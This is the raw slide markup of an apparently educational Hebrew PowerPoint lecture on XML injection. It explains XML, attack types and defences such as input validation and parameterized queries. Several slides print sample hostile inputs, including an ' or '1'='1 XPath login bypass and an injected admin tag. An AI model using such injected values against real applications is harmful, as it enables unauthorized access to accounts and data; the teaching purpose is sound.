              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זה עלול לגרום למערכת לבצע שאילתות לא רצויות, להוציא מידע רגיש או לשנות את התנהגות היישום.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="393258521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37ECBC4-BE18-4651-B2B4-850AADC4C10F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="642594"/>
            <a:ext cx="3352800" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B53ED110-CE9D-4693-ABEE-A36E4472135D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא שפה לסימון נתונים שמאפשרת ארגון וייצוג של נתונים בצורה מובנית. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> משמש לתיאור נתונים בצורה שהיא גם קריאה על ידי בני אדם וגם ניתנת לעיבוד על ידי מכונות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>מאפיינים של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תגים: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> משתמש בתגים שמוגדרים על ידי המשתמש כדי לארגן את הנתונים. כל פריט נתון מוקף בתגים המגדירים את משמעותו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>היררכיה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מאפשר יצירת מבנה היררכי של נתונים, כך שכל פריט נתון יכול להכיל בתוכו פריטים נוספים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עצמאות ממערכת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: קבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הם פורמט טקסטואלי, מה שהופך אותם לנגישים ושימושיים במגוון רחב של מערכות הפעלה ותוכנות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תיאום נתונים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>משמש לתיאום נתונים בין מערכות שונות, כמו למשל העברת מידע בין שרת לקוח או בין מערכות תוכנה שונות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="191234665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65B55FB-E1AC-4D8C-A9EF-36545046586D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3697356" y="642594"/>
            <a:ext cx="7427843" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד פועלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0EBCD1AB-1C30-40E3-96EA-9A7BE401EEAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הזרקת קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף מכניס קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני לשדה קלט במטרה לשנות את מבנה ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שהמערכת פועלת עליו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ביצוע שאילתות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המוזרק עשוי לשמש לביצוע שאילתות נגד מסד נתונים או לשנות את התנהגות היישום.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניצול הפרצה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף יכול לקבל גישה למידע רגיש, לשנות נתונים או להשיג שליטה על התנהגות היישום.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="165304399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94C9684-889D-4554-BB9B-4584350F9550}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3627782" y="642594"/>
            <a:ext cx="7497417" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3FB9EDF-49FB-407F-8C48-9EFBFFA179EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הזרקת תגיות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זדוניות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף מזריק תגיות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לתוך הקלט, כך שהן משנות את מבנה המסמך או מבצעות פעולות לא רצויות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: אם הקלט המצופה הוא שם משתמש, והמשתמש מזין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;/user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זה עלול לגרום לשינויים במבנה ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמוביל להרשאות מנהל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שינוי שאילתות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :XPath/XQuery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מזריק קוד זדוני לשדה קלט שמבצע שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כך שהשאילתה מחזירה תוצאות לא צפויות או מזיקה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: אם השאילתה המקורית היא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>//user[name='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>']</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והמשתמש מזין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>' or '1'=‘1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> השאילתה עלולה להחזיר את כל המשתמשים במקום משתמש ספציפי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פגיעה באימות חתימות דיגיטליות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כאשר מערכת מאמתת חתימות דיגיטליות על מסמכי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, תוקף יכול לשנות את מבנה ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כך שהחתימה תאומת אך תוכן המסמך ישתנה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פגיעה בתעבורת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף יכול להזריק קוד זדוני לתוך תעבורת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לשנות נתונים בזמן אמת, לדוגמה בהעברת נתונים בין מערכות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37147287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A5E0DA3-CC29-4B9E-A96C-2E2E8513011C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="642594"/>
            <a:ext cx="5181600" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה להזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7163379-5E6C-4ECB-A5FF-F16279001B06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו יישום שמקבל שם משתמש וסיסמה, ומבצע שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לבדוק את הרשאות המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קוד שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/users/user[username='$username' and password='$password']</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף יכול להזין בקלט את הערך הבא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or '1’=‘1`</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השאילתה תהפוך להיות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/users/user[username='' or '1'='1' and password='$password']</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במקרה זה, התנאי  '1'='1' תמיד יחזיר ערך נכון, ולכן השאילתה עלולה לאמת את כל המשתמשים, ולאפשר גישה לא מורשית.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="379471367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1276FBD-83C6-44AB-B949-290B3696F01C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9094304" y="642594"/>
            <a:ext cx="2030896"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7058365F-420F-42DC-B4A6-DB33255D181E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מדוע חשוב לבדוק את הקלט מהמשתמש לפני שמבצעים שאילתות על מסמך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד תוקף יכול לנצל את הפונקציונליות של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ביישומים לביצוע התקפה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהן השיטות המומלצות להגן על יישום מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML Injection?</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22618133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8028837-68E2-42E7-AA0B-D0EB806E14DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9044608" y="642594"/>
            <a:ext cx="2080591"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B5C5E7B2-3008-4DC6-8019-0F1C3DF7BEDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. אם לא בודקים את הקלט, ניתן להזריק קוד זדוני שיבצע פעולות לא רצויות כמו שינוי מבנה ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או השגת מידע רגיש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. התוקף יכול לנצל שדות קלט לא מבוקרים להזרקת קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני או לשינוי שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כך שהן יחזירו תוצאות לא צפויות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. שימוש באימות קפדני של הקלט, הסננת קלט זדוני, שימוש בפרמטרים בשאילתות במקום הצבת ערכים ישירות, והימנעות מהערכה ישירה של קוד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שסופק על ידי המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19353472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סבון">
  <a:themeElements>
    <a:clrScheme name="סבון">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סבון">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סבון">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TM03457510[[fn=סבון]]</Template>
  <TotalTime>578</TotalTime>
  <Words>12997</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>מסך רחב</PresentationFormat>
  <Paragraphs>939</Paragraphs>
  <Slides>146</Slides>
  <Notes>0</Notes>
  <HiddenSlides>0</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146</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="149" baseType="lpstr">
      <vt:lpstr>Century Gothic</vt:lpstr>
      <vt:lpstr>Garamond</vt:lpstr>
      <vt:lpstr>סבון</vt:lpstr>
      <vt:lpstr>הרצאה 6 </vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>1. ניסיונות התחברות כושלים מרובים</vt:lpstr>
      <vt:lpstr>2. תעבורה לא שגרתית ברשת</vt:lpstr>
      <vt:lpstr>3. שינויים בקבצים חיוניים</vt:lpstr>
      <vt:lpstr>4. מיילים לא שגרתיים או מיילים מכתובות חשודות</vt:lpstr>
      <vt:lpstr>5. הודעות מערכת שגויות או לא צפויות</vt:lpstr>
      <vt:lpstr>6. התקנת תוכנות לא מוכרות או לא מאושרות</vt:lpstr>
      <vt:lpstr>7. חשבונות משתמש חדשים ולא מוכרים</vt:lpstr>
      <vt:lpstr>המשך - תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>המשך - תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>המשך - תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>שאלות - תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>תשובות - תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>המשך תשובות - תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>המשך תשובות - תופעות חשודות באבטחת מידע</vt:lpstr>
      <vt:lpstr>ננסה לנטר את התעבורה ברשת ולמפות דברים עוינים</vt:lpstr>
      <vt:lpstr>ננסה לנטר את התעבורה ברשת ולמפות דברים עוינים</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מהי תוכנה זדונית?</vt:lpstr>
      <vt:lpstr>סוגי תוכנות זדוניות</vt:lpstr>
      <vt:lpstr>המשך - סוגי תוכנות זדוניות</vt:lpstr>
      <vt:lpstr>המשך - סוגי תוכנות זדוניות</vt:lpstr>
      <vt:lpstr>איך מזהים ומונעים תוכנות זדוניות?</vt:lpstr>
      <vt:lpstr>שאלות - תוכנות זדוניות</vt:lpstr>
      <vt:lpstr>תשובות - תוכנות זדוניות</vt:lpstr>
      <vt:lpstr>דוגמא בקוד:</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>הקדמה</vt:lpstr>
      <vt:lpstr>סוגי וירוסים נפוצים:</vt:lpstr>
      <vt:lpstr>איך מתגוננים מפני וירוסים?</vt:lpstr>
      <vt:lpstr>שאלות - וירוס</vt:lpstr>
      <vt:lpstr>תשובות - וירוס</vt:lpstr>
